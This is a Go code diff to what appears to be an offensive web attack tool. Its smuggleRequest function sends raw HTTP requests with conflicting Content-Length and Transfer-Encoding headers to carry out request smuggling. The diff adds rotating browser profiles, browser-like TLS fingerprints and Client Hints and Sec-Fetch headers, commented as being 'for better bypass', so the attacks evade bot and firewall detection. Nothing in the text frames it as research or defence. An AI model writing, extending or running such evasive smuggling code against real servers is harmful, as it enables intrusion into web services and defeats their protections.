@@ -92,6 +92,9 @@ func runRequestSmuggling(cfg *AttackConfig) {
 }
 
 func smuggleRequest(host, port, hostHeader, path string, useTLS bool, variant int) error {
+	// Rotate browser profile for better bypass
+	profile := GetRandomProfile()
+	
 	dialer := &net.Dialer{Timeout: 6 * time.Second}
 	rawConn, err := dialer.Dial("tcp", host+":"+port)
 	if err != nil {
@@ -105,10 +108,9 @@ func smuggleRequest(host, port, hostHeader, path string, useTLS bool, variant in
 
 	var conn net.Conn = rawConn
 	if useTLS {
-		tlsConn := tls.Client(rawConn, &tls.Config{
-			InsecureSkipVerify: true,
-			ServerName:         hostHeader,
-		})
+		// Use browser-specific TLS fingerprint
+		tlsConfig := CreateTLSConfig(profile, hostHeader)
+		tlsConn := tls.Client(rawConn, tlsConfig)
 		tlsConn.SetDeadline(time.Now().Add(8 * time.Second))
 		if err := tlsConn.Handshake(); err != nil {
 			return err
@@ -120,6 +122,12 @@ func smuggleRequest(host, port, hostHeader, path string, useTLS bool, variant in
 	conn.SetDeadline(time.Now().Add(6 * time.Second))
 
 	var req string
+	
+	// Build Client Hints headers
+	clientHints := ""
+	for key, val := range profile.ClientHints {
+		clientHints += fmt.Sprintf("%s: %s\r\n", key, val)
+	}
 
 	switch variant {
 	case 0:
@@ -131,10 +139,20 @@ func smuggleRequest(host, port, hostHeader, path string, useTLS bool, variant in
 			"POST %s HTTP/1.1\r\n"+
 				"Host: %s\r\n"+
 				"User-Agent: %s\r\n"+
+				"Accept: %s\r\n"+
+				"Accept-Language: %s\r\n"+
+				"Accept-Encoding: %s\r\n"+
+				"%s"+
+				"Sec-Fetch-Dest: empty\r\n"+
+				"Sec-Fetch-Mode: cors\r\n"+
+				"Sec-Fetch-Site: same-origin\r\n"+
+				"DNT: 1\r\n"+
 				"Content-Length: %d\r\n"+
 				"Transfer-Encoding: chunked\r\n"+
 				"\r\n%s",
-			path, hostHeader, randomUA(), len(body), body,
+			path, hostHeader, profile.UserAgent,
+			profile.Accept, profile.AcceptLanguage, profile.AcceptEncoding,
+			clientHints, len(body), body,
 		)
 
 	case 1:
@@ -144,10 +162,20 @@ func smuggleRequest(host, port, hostHeader, path string, useTLS bool, variant in
 			"POST %s HTTP/1.1\r\n"+
 				"Host: %s\r\n"+
 				"User-Agent: %s\r\n"+
+				"Accept: %s\r\n"+
+				"Accept-Language: %s\r\n"+
+				"Accept-Encoding: %s\r\n"+
+				"%s"+
+				"Sec-Fetch-Dest: empty\r\n"+
+				"Sec-Fetch-Mode: cors\r\n"+
+				"Sec-Fetch-Site: same-origin\r\n"+
+				"DNT: 1\r\n"+
 				"Content-Length: 4\r\n"+
 				"Transfer-Encoding: chunked\r\n"+
 				"\r\n%s\r\n%s",
-			path, hostHeader, randomUA(), formatChunkSize(len(smuggled)), smuggled,
+			path, hostHeader, profile.UserAgent,
+			profile.Accept, profile.AcceptLanguage, profile.AcceptEncoding,
+			clientHints, formatChunkSize(len(smuggled)), smuggled,
 		)
 
 	case 2:
